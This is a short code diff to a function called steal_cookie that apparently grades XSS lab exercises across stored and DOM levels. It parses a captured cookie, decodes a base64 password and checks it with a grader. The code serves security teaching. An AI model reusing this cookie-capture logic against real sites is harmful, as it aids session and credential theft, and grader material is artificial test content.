@@ -21,12 +21,20 @@ def steal_cookie(vuln_type):
         password = base64.b64decode(password64).decode('utf-8')
         grader.xss_verify(vuln_type, password) # Remember to decode the password.
 
-    elif vuln_type == 'stored_low':
-        # print("Received Cookie: " + received_cookie)
+    elif (vuln_type == 'stored_low' or vuln_type == 'stored_medium' or
+          vuln_type == 'stored_high'):
         ind = received_cookie.find('password=')
         password64 = received_cookie[ind+len('password='):]
         password = base64.b64decode(password64).decode('utf-8')
         grader.xss_verify(vuln_type, password) # Remember to decode the password.
+
+    elif (vuln_type == 'DOM_low' or vuln_type == 'DOM_medium' or
+          vuln_type == 'DOM_high'):
+        ind = received_cookie.find('password=')
+        password64 = received_cookie[ind+len('password='):]
+        password = base64.b64decode(password64).decode('utf-8')
+        grader.xss_verify(vuln_type, password) # Remember to decode the password.
+
 
     return received_cookie+'\n'
 
